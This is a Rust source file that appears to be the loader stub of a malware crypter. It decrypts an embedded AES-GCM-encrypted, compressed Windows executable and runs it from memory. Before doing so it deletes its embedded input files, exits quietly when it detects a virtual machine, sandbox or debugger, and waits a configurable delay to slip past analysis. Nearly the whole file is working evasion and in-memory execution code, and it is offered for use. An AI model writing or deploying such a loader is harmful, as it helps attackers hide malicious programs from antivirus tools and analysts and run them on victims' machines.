mod generated;
mod logger;
use generated::{KEY, NONCE, DELAY_SECS, VERBOSE, VM_DETECTION};
use std::fs;
use std::error::Error;
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};

// Embedded at compile time by the crypter.
static ENCRYPTED: &[u8] = include_bytes!("../payload.enc");
static PADDING: &[u8] = include_bytes!("../padding.bin");

fn cleanup_embedded_files() -> Result<(), std::io::Error> {
    let files = [
        "../payload.enc",
        "../padding.bin",
    ];

    for file in files {
        match fs::remove_file(file) {
            Ok(()) => {
                // File removed successfully.
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                // Already removed.
            }
            Err(e) => {
                return Err(e);
            }
        }
    }

    Ok(())
}

fn vm_detected() -> bool {
    // WARNING: unreliable standalone VM/sandbox check.
    // The crate's heuristics can be outdated, bypassed, or produce
    // false negatives on modern or custom-configured VMs.
    antilysis::detected().unwrap_or(false)
}

fn debugger_detected() -> bool {
    // WARNING: unreliable standalone anti-debug check.
    // The crate's heuristics can be outdated, bypassed, or produce
    // false negatives on modern or custom-configured VMs.
    anti_debug::is_debugger_present().unwrap_or(false)
}

fn decompress() -> Result<Vec<u8>, std::io::Error> {
    zstd::decode_all(ENCRYPTED)
}

fn decrypt(ciphertext: &[u8]) -> Result<Vec<u8>, aes_gcm::Error> {
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&KEY));
    let plaintext = cipher.decrypt(Nonce::from_slice(&NONCE),ciphertext,)?;

    if VERBOSE {
        logger::log_info("Binary decrypted successfully.");
    }

    Ok(plaintext)
}

fn execute(pe_bytes: &[u8]) -> Result<(), Box<dyn Error>> {
    let module = maple_rs::Maple::load_executable_from_memory(pe_bytes).map_err(|e| format!("Failed to load executable: {e}"))?;
    module.execute_entry_point().map_err(|e| format!("Failed to execute entry point: {e}"))?;

    if VERBOSE {
        logger::log_ok("Target program executed.");
    }

    Ok(())
}

fn delay_execution() {
    if DELAY_SECS > 0 {
        if VERBOSE {
            logger::log_info(&format!("Delaying execution by {} seconds...", DELAY_SECS));
        }

        std::thread::sleep(std::time::Duration::from_secs(DELAY_SECS));
    }
}

fn run() -> Result<(), Box<dyn Error>> {
    std::hint::black_box(&PADDING);

    cleanup_embedded_files().map_err(|e| format!("Failed to clean up embedded files: {e}"))?;

    if VM_DETECTION && vm_detected() {
        if VERBOSE {
            logger::log_info("VM detected. Exiting...");
        }
        return Ok(());
    }

    if debugger_detected() {
        if VERBOSE {
            logger::log_info("Debugger detected. Exiting...");
        }
        return Ok(());
    }

    delay_execution();

    let ciphertext = decompress()
        .map_err(|e| format!("Failed to decompress payload: {e}"))?;

    let pe_bytes = decrypt(&ciphertext)
        .map_err(|_| "Failed to decrypt payload. The encrypted data may be corrupted or the key/nonce may be incorrect.")?;

    execute(&pe_bytes)?;

    Ok(())
}

fn main() {
    if let Err(error) = run() {
        if (VERBOSE) {
            logger::log_error(&format!("Error: {error}"));
        }
        std::process::exit(1);
    }
}
